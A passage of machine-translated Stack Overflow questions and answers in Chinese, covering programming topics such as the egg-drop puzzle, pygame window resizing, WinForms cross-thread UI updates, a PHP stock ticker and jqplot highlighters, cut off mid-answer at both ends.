 UIGraphicsBeginImageContextWithOptions(size, false, UIScreen.main.scale) 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-07-22T19:23:57.753

您可以通过以下方法获取设备的刻度值

```
[[UIScreen mainScreen] scale] 
```

有了这些信息，您可以决定要绘制多少点。

# google-closure-library - 为什么我的 Google Closure 代码中总是出现这 2 个错误？

> ID：11603215
> 
> 赞同：1
> 
> 时间：2012-07-22T19:10:02.233
> 
> 标签：google-closure-library

我正在使用 Plovr 用这个配置文件编译我的 javascript。

```
// File: config.js
{
  "debug": true,
  "id": "myfirstapp",
  "paths": ".",
  "inputs": "main.js",
  "level": "VERBOSE",
  "mode": "ADVANCED",
  "pretty-print": true
} 
```

奇怪的是，我的应用程序可以工作，但我一直在 Chrome 控制台中遇到这 2 个错误。

```
GET http://www.myunreleasedapp.com/deps.js 404 (NOT FOUND) a.js:181
Uncaught TypeError: Cannot read property 'debug' of undefined 
```

我检查了第二个错误，发现该属性`Params.settings`未定义，因此调用`Params.settings.debug`会产生此错误。但是，我不确定在我的 Closure 代码中哪里可以解决这两个错误中的任何一个。关于在我的代码中要注意什么的任何建议？

第二个错误 ( `Uncaught TypeError: Cannot read property 'debug' of undefined` ) 奇怪地出现在 58852.user.js 中这条非常长的行中：

```
saveSettings();Extend(that,Params);Params.enabled=
(Registry.getKey("enabled","enabled")=="enabled"?true:false);Params.isPage=
(getFromId("jewelFansTitle")?
true:false);Params.debug=Params.settings.debug;try{Params.iFrame=
(window.top!=self)}catch(exception){new ErrorHandler(exception)}try{if(Params.mobile)
{Params.mobileId=getFromId("m_user_DEPRECATED").value}}catch(exception){new 
ErrorHandler(exception)}function trace(){if(!Params.dev)
{return}try{if(!traced[arguments.callee.caller.name]){traced[arguments.callee.caller.name]=0 
```

再次，`Params.settings`似乎是未定义的。这是一个 Facebook 应用程序，所以我认为这段代码可能与 Facebook 相关。

# ruby-on-rails - 使用 Ruby Gem 电子表格合并单元格

> ID：11603216
> 
> 赞同：6
> 
> 时间：2012-07-22T19:10:05.180
> 
> 标签：ruby-on-rails, excel, spreadsheet

如何使用 Ruby 电子表格 gem 合并单元格。我想合并工作表第一行的前 6 个单元格。当我尝试以下操作时，它不起作用：

```
merge_format = Spreadsheet::Format.new :align => :merge
6.times do |j|
  sheet.row(0).set_format(j,merge_format)
end 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-07-22T19:35:41.227

你可以简单地做

```
sheet.merge_cells(start_row, start_col, end_row, end_col) 
```

如果您想使用`set_format`，我建议您尝试`:vertical_align => :merge`一下，尽管我没有使用它，因为它`merge_cells`一直对我有用。

# algorithm - 三蛋问题 m

> ID：11603218
> 
> 赞同：14
> 
> 时间：2012-07-22T19:10:18.023
> 
> 标签：algorithm, math

我只是在阅读[两个鸡蛋问题](http://www.datagenetics.com/blog/july22012/index.html)：

> **两个鸡蛋问题**
> 
> 你会得到两个鸡蛋，并可以进入一座 100 层高的建筑。两个鸡蛋是一样的。目的是找出鸡蛋从该楼层的窗户掉出时不会破裂的最高楼层。如果一个鸡蛋掉下来并且没有破裂，它就完好无损，可以再次掉下。然而，一旦一个鸡蛋被打破，那就是那个鸡蛋。
> 
> 如果一个鸡蛋从地板上掉下来`n`就碎了，那么它也会从上面的任何地板上碎掉。如果一个鸡蛋在坠落中幸存下来，那么它会在任何比这更短的坠落中幸存下来。
> 
> 问题是：*你应该采取什么策略来最小化找到解决方案所需的鸡蛋滴数？*. （最坏的情况是什么？）

我一直跟着，直到“看，我可以做三个”部分。作者指出，在第一个鸡蛋破裂后，它会退化为 2-egg 问题，并且可以递归解决。

这很好，但是当使用 3 个鸡蛋而不是 2 个（第一个鸡蛋）时，我们不想选择更大的步长吗？我们从哪一层扔第一个鸡蛋？

有1个鸡蛋，我们必须从1楼开始。
有2个鸡蛋，我们求解`n(n+1)/2=k`并四舍五入，哪里`n`是起始楼层，`k`是楼层数。
使用 3... 我无法想出一个公式。

* * *

再想一想，如果有 2 个鸡蛋，最大掉落数等于我们掉落第一个鸡蛋的楼层数。例如，有 2 个鸡蛋和 100 个楼层，解决方案是 14，这意味着我们从 14 层丢下第一个鸡蛋，如果它坏了，我们必须再丢 13 次，对于 1-13 层。

用 3 个鸡蛋，解决方案是 9（如图所示）。但是我们不想把第一个鸡蛋扔到第 9 层，我们可以把它扔得更高，因为我们不必在中间进行 1 秒的迭代。

如果我们再次从 14 楼扔出去，它坏了，那么我们就递归。`n(n+1)/2=k`现在 13在哪里`k`...但是这给了我们 4.815，如果我们 ceil 和那个并加上我们之前的下降，我们得到 6，这低于实际的解决方案，所以这里有问题...

* * *

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-22T22:04:18.380

> 如果我们再次从 14 楼扔出去，它坏了，那么我们就递归。n(n+1)/2=k 其中 k 现在是 13...但是这给了我们 4.815，如果我们 ceil 和那个加上我们之前的下降，我们得到 6，这低于实际的解决方案，所以这里是错误的...

如果不破怎么办？那么你有一个 86 层的三个鸡蛋的问题，它可能比 100 层的问题少一滴解决。

假设你从 50 楼掉下第一个^(鸡蛋)。如果它坏了，你有一个 49 层的两个鸡蛋问题，最多需要 10 次额外的下降。因此，最坏的情况是 11 滴（因为如果它没有破裂，那么 50 层的三个鸡蛋问题最多需要额外滴 7 滴）。

如果第一滴选择37层，如果破了，就是36层的二蛋问题，最多需要8个额外的滴^。如果它没有破裂，那么你还有一个 63 层的三蛋问题。你想用最多 8 滴来解决这个问题，所以如果下一滴打破鸡蛋，剩下的双蛋问题应该最多 7 滴可以解决，因此你可以为第二滴选择的最高楼层是`37 + 28 + 1 = 66`，因为28 层是你最多可以用 7 滴和两个鸡蛋解决的最高层。如果鸡蛋没有破，你就有了一个 34 层的三蛋问题，还剩 7 滴。如果鸡蛋破裂是21（6 * 7 / 2），你当然可以用剩下的6滴解决最高，所以你可以选择地板`66 + 21 + 1 = 88`. 如果鸡蛋没有破，你还有 12 层楼剩下 6 滴，这已经可以只用两个鸡蛋了。

系统地，你当然可以用`d`水滴和`e`鸡蛋解决的最高楼层数是

```
 / 1, if d == 1
F(e,d) = |  d, if e == 1
          \ F(e-1,d-1) + 1 + F(e,d-1), if e > 1 and d > 1 
```

如果你只有一滴，你别无选择，只能选择你还不知道鸡蛋不会破的最低层。如果它打破了它，并且你尝试了更高的楼层，你不知道一楼打破了鸡蛋。

如果您只有一个鸡蛋，则必须按顺序检查每个楼层，直到鸡蛋破裂或用完为止。

否则，如果第一滴是来自高于`F(e-1,d-1) + 1`的楼层，如果鸡蛋破裂，您可能找不到第一个破地板。`d-1`如果第一滴是从较低的楼层，如果鸡蛋不破，你就不能达到那么高，所以第一滴应该是从地板上`F(e-1,d-1) + 1`。如果它坏了，你可以用剩下的`e-1`鸡蛋和`d-1`假设来解决。如果没有，你可以用剩下的水滴和鸡蛋解决下`F(e,d-1)`一层。

`f`相反，要找出铺有鸡蛋的地板可能需要多少滴`e`，您必须找到

```
D(e,f) = min { d | F(e,d) >= f } 
```

你可以通过计算`F(e,d)`矩阵来发现，也可以使用动态规划：

如果您选择`s`第一次下降的地板，如果鸡蛋破裂，您需要最多`D(e-1,s-1)`下降以确定地板。如果鸡蛋没有破裂，则需要最多`D(e,f-s)`滴下才能确定地板。`s`所以第一次下降选择地板的最坏情况是

```
WC(s,e,f) = 1 + max { D(e-1,s-1), D(e,f-s) } 
```

最坏的情况是最好的

```
D(e,f) = minimum { WC(s,e,f) | 1 <= s <= f } 
```

（当然在哪里`D(e,0) = 0`）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-12-23T11:04:17.453

这个问题可以通过以下 3 种方法（我知道）来解决：

1.  动态规划
2.  使用二叉搜索树的解决方案
3.  通过获得可以测试或覆盖给定数量的鸡蛋和给定的滴数的最大楼层数的直接数学公式来解决

让我先定义一些符号如下：

```
e = number of eggs
f = number of floors in building
n = number of egg drops 
Fmax(e, n) = maximum number of floors that can be tested with e eggs and n drops 
```

动态规划方法的关键在于以下 Fmax 的递归公式：

```
Fmax(e, n) = 1 + Fmax(e-1, n-1) + fmax(e, n-1) 
```

而获得 Fmax 的直接数学公式的关键在于以下 Fmax 的递推公式：

```
Fmax(e, n) = { ∑Fmax(e-1,i) for i = 1 to n } - Fmax(e-1, n) + n 
```

对于这个问题，使用二叉搜索树 (BST) 的替代解决方案也是可能的。为了方便我们的分析，我们画出BST，稍作修改如下：

```
1\.    If egg breaks then child node is drawn on left down side
2\.    If egg does not break then child node is drawn straight down side 
```

如果我们用上述表示形式绘制 BST，则 BST 的宽度（即 BST 中的垂直列数）表示鸡蛋的数量。

任何具有 f 个节点的 BST，以上述表示形式绘制并受到 BST <= e（鸡蛋数）的约束宽度是一个解决方案，但它可能不是最佳解决方案。

因此，获得最优解相当于获得 BST 中节点的排列方式，其最小高度受到约束：BST 的宽度 <= e

有关以上 3 种方法的更多详细信息，请查看我的博客：[解决广义蛋掉落问题的 3 种方法](http://rushikdm.blogspot.in/2016/12/e-eggs-f-floors-puzzle.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-11-03T17:27:51.067

这与我在[Egg Drop Printing Solutions](https://stackoverflow.com/questions/64504367/egg-drop-printing-solutions/64517326#64517326)提供的答案相同。我在这里为任何想要查看整个决策树和推理的人提供它。

```
# This uses dynamic programming to find the basic information.
def optimal_solution(floors, eggs):
    # dp[drops][eggs] = max_floors
    dp = []

    # With no drops, we can do no floors
    dp.append([0 for x in range(eggs+1)])

    # With one drop and any eggs, we can do 1 floor
    one_drop = [1 for _ in range(eggs+1)]
    one_drop[0] = 0 # Except no eggs is still no floors
    dp.append(one_drop)

    # Keep adding drops until we have our answer
    # Note, in python array element -1 is shorthand for the end of the array.
    while dp[-1][eggs] < floors:
        # 0 floors for 0 eggs.  1 more for one egg
        next_drop = [0, dp[-1][1] + 1]
        for i in range(2, eggs+1): # Python for 2..eggs
            # The best we can do is drop at floor dp[-1][i-1].
            # If the egg breaks, we can find the answer using that solution.
            # If the egg holds, we can find another dp[-1][i] floors.
            next_drop.append(dp[-1][i] + dp[-1][i-1])
        dp.append(next_drop)

    return dp

# This turns that optimal solution into a decision tree.    
def dp_to_decision_tree(dp, floors, start_floor=None, eggs=None, drops=None):
    # Figure out defaults if needed.
    if start_floor is None:
        start_floor = 0
    if drops is None:
        drops = len(dp) - 1
    if eggs is None:
        eggs = len(dp[0]) - 1

    # Are we done?
    if floors == start_floor:
        return start_floor
    elif dp[drops][eggs] < floors - start_floor:
        return None

    # Do we need all of our drops?
    while floors - start_floor < dp[drops-1][eggs]:
        drops -= 1

    drop_at = start_floor + dp[drops-1][eggs-1]
    if eggs == 1:
        drop_at = start_floor + 1
    if floors < drop_at:
        drop_at = floors
    return [
        drop_at,
        dp_to_decision_tree(dp,  floors,     drop_at,   eggs, drops-1),
        dp_to_decision_tree(dp, drop_at-1, start_floor, eggs-1, drops-1),
        {'eggs': eggs, 'floor_range': (start_floor, floors)}
        ]

# This prints the decision tree in a human readable format.
def print_decision_tree(tree, indent="", label="start"):
    if tree is None:
        print(f"{indent}{label}: ?")
    elif isinstance(tree, int):
        print(f"{indent}{label}: {tree} found")
    else:
        print(f"{indent}{label}: {tree[0]} {tree[3]}")
        print_decision_tree(tree[1], indent + "    ", label="held")
        print_decision_tree(tree[2], indent + "    ", label="broke")

# And this calls the previous functions.
def print_optimal_decisions(floors, eggs):
    print_decision_tree(
        dp_to_decision_tree(
            optimal_solution(floors, eggs), floors))

# And now we can try it.
print_optimal_decisions(36, 3) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-22T20:30:36.580

您可以使用简单的动态规划解决方案。n - 楼层数。k - 鸡蛋的数量。D[n,k] = 你回答（最小投掷次数）。对于每个 1 <= j <= n，D[j,1] = n-1。

计算 k>1 的 D[n,k] 的主要思想：

D[n,k] = 最大值 1 <= j <= n-1 { 最大值{ D[j,k-1]+1, D[nj,k]+1 }。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-09-13T22:21:56.710

这里的博客解释了 1000 层的 3 个鸡蛋的数学方法：

[https://sankalpiitr.wordpress.com/2012/03/02/the-2-eggs-problem-extended-to-3-eggs/](https://sankalpiitr.wordpress.com/2012/03/02/the-2-eggs-problem-extended-to-3-eggs/)

根据这个博客公式将是

P = N + ( N * ( N + 1 ) * ( N – 1 ) ) /6

其中 P 是楼层数，N 是所需的最小下降次数。

所以求解 P=100，我们得到 N 为 8.2

# php - 如何让ticker从页面的零像素从右到左滚动？

> ID：11603219
> 
> 赞同：2
> 
> 时间：2012-07-22T19:10:48.900
> 
> 标签：php, javascript

我正在尝试让ticker从页面的零像素从页面的左侧开始从右到左滚动。

下面是代码。

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
 <head>
  <title> New Document </title>
  <meta name="Generator" content="EditPlus">
  <meta name="Author" content="">
  <meta name="Keywords" content="">
  <meta name="Description" content="">
  <style type="text/css">
#marqueeborder {
    color: #cccccc;
    background-color:  #000000;
    font-family:Arial, Helvetica, sans-serif;
    position:relative;
    height:20px;
    overflow:hidden;
    font-size:.8em;
}
#marqueecontent {
    position:absolute;
    left:0px;
    line-height:20px;
    white-space:nowrap;
}
.stockbox {
    margin:0 10px;
}
.stockbox a {
    color: #cccccc;
    text-decoration : none;
    font-weight: 400;
}
  </style>
<script type="text/javascript">

    // Original script by Walter Heitman Jr, first published on http://techblog.shanock.com

    // Set an initial scroll speed. This equates to the number of pixels shifted per tick
    var scrollspeed=3;
    var pxptick=scrollspeed;
var marqueediv='';
var contentwidth="";
var marqueewidth = "";
    function startmarquee(){
        //alert("hi");
        // Make a shortcut referencing our div with the content we want to scroll
        marqueediv=document.getElementById("marqueecontent");
        //alert("marqueediv"+marqueediv);
    //  alert("hi"+marqueediv.innerHTML);

        // Get the total width of our available scroll area
         marqueewidth=document.getElementById("marqueeborder").offsetWidth;
        //alert("marqueewidth"+marqueewidth);
        // Get the width of the content we want to scroll
         contentwidth=marqueediv.offsetWidth;
    //  alert("contentwidth"+contentwidth);
    /// // Start the ticker at 50 milliseconds per tick, adjust this to suit your preferences
        // Be warned, setting this lower has heavy impact on client-side CPU usage. Be gentle.
        var lefttime=setInterval("scrollmarquee()",50);
        //alert("lefttime"+lefttime);
    }

    function scrollmarquee(){
        // Check position of the div, then shift it left by the set amount of pixels.

        if (parseInt(marqueediv.style.left)>(contentwidth*(-1)))
            marqueediv.style.left=parseInt(marqueediv.style.left)-pxptick+"px";
        //alert("hikkk"+marqueediv.innerHTML);}
        // If it's at the end, move it back to the right.
        else{
        //  alert("marqueewidth"+marqueewidth);
            marqueediv.style.left=parseInt(marqueewidth)+"px";
        }
    }

    //window.onload=startmarquee;

</script>
 </head>

 <body>
  <div id="marqueeborder" onmouseover="pxptick=0" onmouseout="pxptick=scrollspeed">

<div id="marqueecontent">

<?php

    // Original script by Walter Heitman Jr, first published on http://techblog.shanock.com

    // List your stocks here, separated by commas, no spaces, in the order you want them displayed:

</div>
</div>

 </body>
</html> 
```

## 编辑

下面附上截图。

![它应该是什么样子](../Images/0dbd1ca62b822ed3135e2dc549d5e24c.png)

Edit2：哦，我错过了它的 index.php

```
<html>
<body>

<?php include 'stockticker.php'; ?>

<h1>Welcome to index page!</h1>

</body>
<script type="text/javascript">
function onloadfun(){
startmarquee();

}
window.onload=onloadfun;
</script>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:49:49.880

好的，给你..你的`scrollmarquee`功能有问题。用这些替换它的内容

```
if (parseInt(marqueediv.offsetLeft)>=(contentwidth*(-1))){
    console.log(parseInt(marqueediv.offsetLeft)-pxptick+"px");
    marqueediv.style.left = parseInt(marqueediv.offsetLeft)-pxptick+"px";
}else{
    marqueediv.style.left=parseInt(marqueewidth)+"px";
} 
```

必须扭转这种情况。现在一切都很好:)

# python - 允许调整窗口大小 pyGame

> ID：11603222
> 
> 赞同：28
> 
> 时间：2012-07-22T19:11:42.057
> 
> 标签：python, pygame

我试图允许调整这个应用程序的大小，我放了 RESIZABLE 标志，但是当我尝试调整大小时，它搞砸了！试试我的代码。

它是一个网格程序，当窗口调整大小时，我希望网格也调整大小/缩小。

```
import pygame,math
from pygame.locals import *
# Define some colors
black    = (   0,   0,   0)
white    = ( 255, 255, 255)
green    = (   0, 255,   0)
red      = ( 255,   0,   0)

# This sets the width and height of each grid location
width=50
height=20
size=[500,500]
# This sets the margin between each cell
margin=1

# Initialize pygame
pygame.init()

# Set the height and width of the screen

screen=pygame.display.set_mode(size,RESIZABLE)

# Set title of screen
pygame.display.set_caption("My Game")

#Loop until the user clicks the close button.
done=False

# Used to manage how fast the screen updates
clock=pygame.time.Clock()

# -------- Main Program Loop -----------
while done==False:
    for event in pygame.event.get(): # User did something
        if event.type == pygame.QUIT: # If user clicked close
            done=True # Flag that we are done so we exit this loop
        if event.type == pygame.MOUSEBUTTONDOWN:
            height+=10

    # Set the screen background
    screen.fill(black)

    # Draw the grid
    for row in range(int(math.ceil(size[1]/height))+1):
        for column in range(int(math.ceil(size[0]/width))+1):
            color = white
            pygame.draw.rect(screen,color,[(margin+width)*column+margin,(margin+height)*row+margin,width,height])

    # Limit to 20 frames per second
    clock.tick(20)

    # Go ahead and update the screen with what we've drawn.
    pygame.display.flip()
# Be IDLE friendly. If you forget this line, the program will 'hang'
# on exit.
pygame.quit () 
```

请告诉我有什么问题，谢谢。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2015-12-05T20:58:49.833

这个问题的答案（允许 Pygame 窗口及其内部的表面调整大小）只是在用户更改其尺寸时（在[`pygame.VIDEORESIZE`](https://www.pygame.org/docs/ref/display.html#pygame.display.set_mode "如果显示设置了 pygame.RESIZABLE 标志，则在用户调整窗口尺寸时将发送 pygame.VIDEORESIZE 事件。")事件上完成）重新创建具有更新大小的可调整大小的窗口。

```
>>> import pygame
>>> help(pygame.display.set_mode)
Help on built-in function set_mode in module pygame.display:

set_mode(...)
    set_mode(size=(0, 0), flags=0, depth=0, display=0, vsync=0) -> Surface
    Initialize a window or screen for display
>>> 
```

这将删除窗口表面上的*所有先前内容*
，因此下面 有一个继续处理当前窗口内容的过程。

**一些示例代码：**

```
import pygame, sys

pygame.init()
# Create the window, saving it to a variable.
surface = pygame.display.set_mode((350, 250), pygame.RESIZABLE)
pygame.display.set_caption("Example resizable window")

while True:
    surface.fill((255,255,255))

    # Draw a red rectangle that resizes with the window.
    pygame.draw.rect(surface, (200,0,0), (surface.get_width()/3,
      surface.get_height()/3, surface.get_width()/3,
      surface.get_height()/3))

    pygame.display.update()
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_ESCAPE:
                pygame.quit()
                sys.exit()

        if event.type == pygame.VIDEORESIZE:
            # There's some code to add back window content here.
            surface = pygame.display.set_mode((event.w, event.h),
                                              pygame.RESIZABLE) 
```

**如何继续当前窗口内容：**
以下是添加前一个窗口内容的一些步骤：

1.  创建第二个变量，设置为旧窗口表面变量的值。
2.  创建新窗口，将其存储为旧变量。
3.  将第二个表面绘制到第一个表面（旧变量）上 - 使用[blit](http://pygame.org/docs/ref/surface.html#pygame.Surface.blit "Pygame 官方文档页面")函数。
4.  使用此变量并删除新变量（可选，使用[`del`](https://docs.python.org/3/tutorial/datastructures.html#the-del-statement "官方 Python 文档页面")）以不使用额外内存。

上述步骤的一些示例代码（替换`pygame.VIDEORESIZE`事件`if`语句）：

```
 if event.type == pygame.VIDEORESIZE:
            old_surface_saved = surface
            surface = pygame.display.set_mode((event.w, event.h),
                                              pygame.RESIZABLE)
            # On the next line, if only part of the window
            # needs to be copied, there's some other options.
            surface.blit(old_surface_saved, (0,0))
            del old_surface_saved 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-07-22T22:59:58.337

当窗口更改时，您不会更新宽度、高度或大小。

来自文档： http: [//www.pygame.org/docs/ref/display.html](http://www.pygame.org/docs/ref/display.html)

> 如果显示设置了 pygame.RESIZABLE 标志，则在用户调整窗口尺寸时将发送 pygame.VIDEORESIZE 事件。

您可以`size, w, h`从活动`VIDEORESIZE` [http://www.pygame.org/docs/ref/event.html中获取新信息](http://www.pygame.org/docs/ref/event.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-01-21T03:13:12.750

一个简单的可调整大小的 Hello World 窗口，另外我还在玩类。
分为两个文件，一个用于定义颜色常数。

```
import pygame, sys
from pygame.locals import *
from colors import *

# Data Definition
class helloWorld:
    '''Create a resizable hello world window'''
    def __init__(self):
        pygame.init()
        self.width = 300
        self.height = 300
        DISPLAYSURF = pygame.display.set_mode((self.width,self.height), RESIZABLE)
        DISPLAYSURF.fill(WHITE)

    def run(self):
        while True:
            for event in pygame.event.get():
                if event.type == QUIT:
                    pygame.quit()
                    sys.exit()
                elif event.type == VIDEORESIZE:
                    self.CreateWindow(event.w,event.h)
            pygame.display.update()

    def CreateWindow(self,width,height):
        '''Updates the window width and height '''
        pygame.display.set_caption("Press ESC to quit")
        DISPLAYSURF = pygame.display.set_mode((width,height),RESIZABLE)
        DISPLAYSURF.fill(WHITE)

if __name__ == '__main__':
    helloWorld().run() 
```

颜色.py：

```
BLACK  = (0, 0,0)
WHITE  = (255, 255, 255)
RED    = (255, 0, 0)
YELLOW = (255, 255, 0)
BLUE   = (0,0,255)

GREEN = (0,255,0) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-06-09T06:29:09.793

我发现的一种简单方法是以下代码片段

```
# Imports
from vars import *
from pygame.locals import *

# Main init
pygame.init()

# Basic vars
run = True
s_width = 1000
s_height = 600

# Making display screen. Don't forget the last tag!
screen = pygame.display.set_mode((s_width, s_height), RESIZABLE)

# Main loop
while run:
    # event detection
    for event in pygame.event.get():
        if event.type == QUIT:
            run = False
        # The part which matters for our purposes
        if event.type == WINDOWRESIZED:
            s_width, s_height = screen.get_width(), screen.get_height()
        if event.type == KEYDOWN:
            if event.key == K_ESCAPE:
                run = False
    # Test line to see if the window resizing works properly
    pygame.draw.line(screen, (255, 255, 255), (int(0.3*s_width), int(0.25*s_height)), (int(0.8*s_width), int(0.25*s_height)))
    # Final flip
    pygame.display.flip()

# Quit
pygame.quit() 
```

这样做是允许调整 pygame 窗口的大小。但是由于您经常根据 s_width 和 s_height 来放置许多元素/精灵的位置和大小，因此它还会检测窗口大小何时更改并相应地调整尺寸。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-06-04T18:20:15.337

首先，您在重绘屏幕之前没有检测到新的窗口大小。

`get_size()`在第 45 行添加方法，它可以工作：

```
#--------------------------------------------------------------
# Draw the grid
size = pygame.display.get_surface().get_size() // size update
for row in range(int(math.ceil(size[1]/height))+1):
#--------------------------------------------------------- 
```

然后使用固定的单元格大小（50、20）并填充尽可能多的单元格。如果您想在调整窗口大小时增大/缩小单元格，则必须定义每行/行的单元格数，然后计算单元格大小，然后绘制它们。

# c# - C#从另一个线程将文本附加到文本框不起作用

> ID：11603227
> 
> 赞同：2
> 
> 时间：2012-07-22T19:12:11.383
> 
> 标签：c#, multithreading, user-interface, textbox, appendtext

我的文本框有问题。
我有一个代表 GUI 线程的类和一个用于工作线程的类，它执行一些网络工作，然后必须将日志添加到 GUI 线程的文本框中，以便您可以查看后台发生的情况。
但是，我的问题是 GUI 上什么也没发生，只有调用 addLine() 的调试信息在控制台中。
应该添加日志的方法 addLine() 被调用，但似乎 AppendText() 什么都不做。
我很确定这与线程有关，但我不确定如何解决这个问题。

这是代码：

工作线程：

```
 Form1 form = new Form1();
    // This method gets called in the worker thread when a new log is available
    private void HandleMessage(Log args)
    {
        // Using an instance of my form and calling the function addLine()
        form.addLine(args.Message);
    } 
```

图形用户界面线程：

```
 // This method gets called from the worker thread
    public void addLine(String line)
    {
        // Outputting debug information to the console to see if the function gets called, it does get called
        Console.WriteLine("addLine called: " + line);
        // Trying to append text to the textbox, console is the textbox variable
        // This pretty much does nothing from the worker thread
        // Accessing it from the GUI thread works just fine
        console.AppendText("\r\n" + line);

        // Scrolling to the end
        console.SelectionStart = console.Text.Length;
        console.ScrollToCaret();
    } 
```

我已经尝试做一些 Invoke 的东西，但未能正确使用它。
GUI 要么自己锁定，要么继续什么都不做。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-22T19:14:13.343

如果您不在 UI 线程上，则无法使用 winforms UI。尝试：

```
console.Invoke((MethodInvoker)delegate {
    console.AppendText("\r\n" + line);

    console.SelectionStart = console.Text.Length;
    console.ScrollToCaret();
}); 
```

这会将它撞到 UI 线程上。

# php - PHP中的Z分数到百分位

> ID：11603228
> 
> 赞同：3
> 
> 时间：2012-07-22T19:12:42.743
> 
> 标签：php, statistics

我需要一个[z 分数](http://en.wikipedia.org/wiki/Standard_score)来使用 PHP 中的[百分位数](http://en.wikipedia.org/wiki/Percentile)计算器。是否有适合 PHP 的简单公式或已经编写的函数。我应该使用什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-23T09:24:22.240

最简单的方法是 yahoo dot com 的 aboulang2002 对 PHP 手册的贡献：

```
<?
function erf($x)
{
    $pi = 3.1415927;
    $a = (8*($pi - 3))/(3*$pi*(4 - $pi));
    $x2 = $x * $x;

    $ax2 = $a * $x2;
    $num = (4/$pi) + $ax2;
    $denom = 1 + $ax2;

    $inner = (-$x2)*$num/$denom;
    $erf2 = 1 - exp($inner);

    return sqrt($erf2);
}

function cdf($n)
{
    if($n < 0)
    {
            return (1 - erf($n / sqrt(2)))/2;
    }
    else
    {
            return (1 + erf($n / sqrt(2)))/2;
    }
}

$zscore = MYZSCORE;
print 'Percentile: ' . cdf($zscore) * 100 . "\n";
?> 
```

# javascript - 将对象设置为 Backbone.js 模型，而无需在每个属性上调用“set()”

> ID：11603229
> 
> 赞同：1
> 
> 时间：2012-07-22T19:12:48.433
> 
> 标签：javascript, backbone.js

要在 Backbone 集合中设置数据：

```
var someList = ['a', 'b', 'c'];
collection.reset({models:someList}); 
```

有没有办法用 a 来做到这一点`model`而不必调用`set()`每一个属性？

**例子**

```
var pop_star = {
    first_name: "Stacey",
    last_name:  "Ferguson"
}
// There is no "reset()" function on a model, but is there something like it?
model.reset(pop_star); 
```

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T19:24:38.847

实际上是您正在寻找的[Model.set() 。](http://backbonejs.org/#Model-set)它可以接收 a`hash`并且只会将属性更新到散列中。

```
model.set(pop_star); 
```

# c# - 设备锁定或休眠时音频暂停 MonoTouch

> ID：11603230
> 
> 赞同：2
> 
> 时间：2012-07-22T19:12:51.150
> 
> 标签：c#, iphone, ios5, xamarin.ios, monodevelop

我开发了一个播放音乐曲目的音频应用程序。在 MonoTouch 的 info.plist 文件中，我添加了数组属性 Required background mode ，其值为可听内容。问题是当按下设备的主页按钮、按下锁定按钮或设备自行进入睡眠模式时，音频仍然停止播放，只有在设备解锁并且应用程序再次进入前台后才能恢复。

发生这些操作之一时，如何保持音频播放？除了 MonoTouch 的 info.plist 解决方案外，互联网提供的信息很少。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T09:35:57.803

为了让这类应用在后台或屏幕锁定时播放音乐，您必须将其音频会话类别设置为`AVAudioSessionCategoryPlayback`：

```
NSError *setCategoryError = nil; 

[[AVAudioSession sharedInstance] setCategory: AVAudioSessionCategoryPlayback error: &setCategoryError];

if (setCategoryError) {
    NSLog(@"couldn't setup audio session category!");
} 
```

[在 Apple 的音频会话编程指南](http://developer.apple.com/library/IOs/#documentation/Audio/Conceptual/AudioSessionProgrammingGuide/Configuration/Configuration.html)中了解更多信息。

# javascript - jqplot 仅在一张图表上显示荧光笔

> ID：11603231
> 
> 赞同：6
> 
> 时间：2012-07-22T19:12:56.713
> 
> 标签：javascript, jquery, charts, jqplot, jqplot-highlighter

我有一个带有两条数据线的 jqplot 图表。只有一个应该启用荧光笔。我试过这个：

```
series:[
    {
        highlighter: {
            formatString: "",
            show: false
        }
    },
    {
        highlighter: {
            formatString: "Day %s: %d",
            show: true
        }
    }
] 
```

但不幸的是，这不起作用：荧光笔在第一行显示一个小空点，而它应该什么也不显示。

如何在一张图表上显示荧光笔而不在另一张图表上显示荧光笔？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-23T14:06:28.573

这是一个非常有趣的问题（+1）。我想到的唯一解决方案是，因为使用绘图选项没有帮助，所以每次它应该显示时都清理画布并隐藏荧光笔的工具提示。这是在下面的代码中完成的，并[在此处提供的工作示例中提供](http://jsfiddle.net/Boro/LSLzB/)。

```
$('#chart').bind('jqplotMouseMove', function(event, xy, axesData, neighbor, plot) {
    if (neighbor && neighbor.seriesIndex == 0) {
        var drawingCanvas = $(".jqplot-highlight-canvas")[0];
        var context = drawingCanvas.getContext('2d');
        context.clearRect(0, 0, drawingCanvas.width, drawingCanvas.height);
        $('.jqplot-highlighter-tooltip').hide();
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-08-03T07:02:41.687

`showHighlight: false`为不需要荧光笔的系列设置

# java - 你如何在android中仅垂直重复图像？

> ID：11603233
> 
> 赞同：6
> 
> 时间：2012-07-22T19:13:04.230
> 
> 标签：java, android, image

有没有办法在android中只垂直重复图像？我试过这样：

```
<bitmap xmlns:android="http://schemas.android.com/apk/res/android"
    android:src="@drawable/asphalt_texture"
    android:tileMode="repeat"
    android:dither="true"/> 
```

但它以两种方式重复，我只希望它垂直重复，任何想法都将不胜感激！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T19:37:20.603

